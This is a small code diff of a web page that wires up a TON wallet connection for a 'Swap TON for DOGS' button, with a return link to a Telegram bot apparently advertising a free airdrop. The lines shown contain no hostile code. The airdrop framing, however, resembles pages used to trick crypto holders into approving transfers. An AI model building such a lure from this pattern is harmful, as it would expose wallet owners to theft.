@@ -11,15 +11,18 @@
     <button id="connectWalletButton">Connect Wallet</button>
     <button id="swapButton" disabled>Swap TON for DOGS</button>
     <div id="status"></div>
-
     <script>
-        const connector = new TonConnect({
+        const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
             manifestUrl: 'https://sh4do96.github.io/TelegramBot/tonconnect-manifest.json',
-            buttonRootId: 'connectWalletButton'
+            buttonRootId: 'ton-connect'
         });
         tonConnectUI.uiOptions = {
       twaReturnUrl: 'https://t.me/FreeTonAirDrop2025_bot'
-        }
+  };
+  
+    </script>
+    <script>
+
 
         const connectWallet = async () => {
             try {
